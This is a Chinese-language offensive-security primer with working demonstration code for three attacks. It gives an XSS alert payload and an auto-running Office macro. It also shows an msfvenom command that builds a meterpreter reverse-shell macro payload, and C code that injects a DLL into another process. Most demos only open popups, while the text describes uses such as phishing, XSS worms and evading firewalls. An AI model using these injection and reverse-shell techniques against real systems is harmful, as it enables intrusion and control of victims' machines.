跨站脚本

原理

跨站脚本攻击通过在浏览器环境下插入恶意JS脚本代码来窃取用户信息，获取用户权限。或者和其他漏洞组合进行更复杂的攻击

实现

XSS要实现弹窗最基本的就是如下JS代码

  1. <script>alert("hacked by 3072")</script>

不同的网站对敏感字符的过滤不同，XSS的发现与脚本的各种变形这里不予以讨论

其他

除了弹窗，我们还可以用XSS来获取用户真实IP，钓鱼，制作XSS蠕虫，甚至能交给SRC赚零花钱

Office宏

原理

宏病毒是一种很常见的计算机病毒，存在于文档或模板中，它通过在Office环境下插入恶意VB脚本代码来达到攻击者的目的

实现

宏病毒要实现弹窗最基本的就是如下VB代码

  1. Private Sub Document_Open()
  2. MsgBox "hacked by 3072"
  3. End Sub

其他

除了弹窗，我们也可以通过宏病毒getshell，如果你精通VB那就只是编码的问题了，当然我们也可以通过msfvenom来帮助我们生成payload

  1. msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=host LPORT=port -f vba -o filename

有些时候生成的VB代码并不好用，如果不了解VB语言，将很难对payload进行改造

DLL注入

原理

DLL注入是一种进程注入形式，它在操作系统环境下强迫一个远程进程加载由C/C++编写的恶意DLL来达到攻击的目的

实现

要实现DLL注入的弹窗我们可以利用已有的注入工具，也可以自己编写注入代码

最基本实现注入的C代码如下

  1. void inject(int Pid, char* path) {

  3.     //拿需要注入的进程的句柄
  4.     HANDLE handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Pid);

  6.     //获得句柄,然后拿到LoadLibraryA的地址
  7.     HMODULE hmodule = LoadLibrary("KERNEL32.dll");
  8.     LPTHREAD_START_ROUTINE lpStartAddress = (LPTHREAD_START_ROUTINE)GetProcAddress(hmodule, "LoadLibraryA");

  10.     //拿到要写入数据的的指定进程中的基址的指针，并向其中写入数据
  11.     LPVOID parameterAdress = VirtualAllocEx(handle,0,strlen(path) + 1, MEM_COMMIT, PAGE_READWRITE);
  12.     WriteProcessMemory(handle, parameterAdress, path, strlen(path) + 1, NULL);

  14.     CreateRemoteThread(handle, NULL, 0, lpStartAddress, parameterAdress, 0, NULL);
  15. }

弹窗DLL代码如下

  1. extern "C" _declspec(dllexport) void message();

  3. void message() {
  4.     MessageBox(NULL, "hacked by 3072", "信息", MB_YESNO);
  5. }

其他

DLL注入技术广泛用于隐藏恶意代码，同时也可以用来绕过一些安全机制和防火墙，同时需要我们掌握DLL编写技术，如果不了解C/C++，将很难达到目的
